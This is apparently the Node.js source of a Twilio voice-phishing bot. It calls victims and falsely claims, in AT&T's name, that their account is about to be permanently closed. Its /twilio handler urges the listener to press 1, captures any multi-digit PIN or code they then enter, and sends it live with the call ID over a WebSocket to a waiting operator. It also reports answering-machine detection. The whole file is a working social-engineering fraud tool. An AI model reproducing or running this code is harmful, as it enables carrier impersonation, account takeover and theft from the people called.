const WebSocket = require('ws');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();
const server = require('http').createServer(app);
const expressWs = require('express-ws')(app, server);
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const clients = new Map();
const callIds = new Map();

// Middleware para manejar tiempos de espera
app.use((req, res, next) => {
    res.setTimeout(30000, () => {
        console.log('Request has timed out.');
        res.sendStatus(408);
    });
    next();
});

function generateClientId() {
    return Math.random().toString(36).substr(2, 9);
}

function sleep(ms = 1000) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Manejo de conexiones de clientes
app.ws('/', (ws, req) => {
    let clientId;

    ws.on("message", function incoming(message) {
        const msg = JSON.parse(message);

        if (msg.action === "initiate_call" && !clientId) {
            clientId = generateClientId();
            clients.set(clientId, ws);
            callIds.set(clientId, msg.call_id);
            console.log("Client Connection Initiated", clientId, msg.call_id);
        }

        if (!clientId || !callIds.get(clientId)) {
            console.log("Client not initialized. No valid call_id found.");
            return;
        }
    });

    ws.on("close", function close() {
        clients.delete(clientId);
        callIds.delete(clientId);
    });
});

function getOrCreateClientId(CallSid) {
    let clientId;
    for (const [key, value] of callIds.entries()) {
        if (value === CallSid) {
            clientId = key;
            break;
        }
    }

    return clientId;
}

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Responde a la solicitud GET en la ruta raíz
app.get("/", (req, res) => {
    res.send("Hello, your WebSocket server is running!");
});

app.post("/twilio", async (req, res) => {
    const CallSid = req.body.CallSid;
    const Digits = req.body.Digits;
    const AnsweredBy = req.body.AnsweredBy;

    const twiml = new VoiceResponse();
    const clientId = getOrCreateClientId(CallSid);
    const destinationClient = clients.get(clientId);

    if (AnsweredBy) {
        console.log(`AnsweredBy`, AnsweredBy, new Date().toISOString());
        if (destinationClient && destinationClient.readyState === WebSocket.OPEN) {
            destinationClient.send(JSON.stringify({ call_id: CallSid, event: "amd_result", answered_by: AnsweredBy }));
        }
    } else if (Digits) {
        if (destinationClient && destinationClient.readyState === WebSocket.OPEN) {
            if (Digits === "1") {
                console.log(`Se presionó uno`, Digits);
                destinationClient.send(JSON.stringify({ call_id: CallSid, event: "digit_1_received" }));
            } else if (Digits.length > 1) {
                console.log(`Se introdujo más de un dígito`, Digits);
                twiml.say({ voice: 'Polly.Joanna' }, "One moment please.");
                await sleep(1000);
                destinationClient.send(JSON.stringify({ call_id: CallSid, event: "pin_received", pin: Digits }));
            } else {
                console.log(`Dígito introducido no válido`, Digits);
                twiml.say({ voice: 'Polly.Joanna' }, "You have entered an invalid digit. Please press 1 to cancel this request.");
            }
        }

        if (Digits === "1") {
            twiml.pause({ length: 120 });
        } else {
            twiml.pause({ length: 10 });
        }
    } else {
        const gather = twiml.gather({ numDigits: 1 });
        twiml.say("Your A T and T account is scheduled for permanent closure. If you did not request this, please press 1 to cancel. Be advised that all numbers associated with your account will be lost, and you will be unable to open a new account with us once this cancellation is complete.");
    }

    res.type('text/xml');
    res.send(twiml.toString());
});

// Usa el puerto asignado por Heroku
const PORT = process.env.PORT || 8080;
server.listen(PORT, function listening() {
    console.log(`Server started on http://localhost:${PORT}`);
});
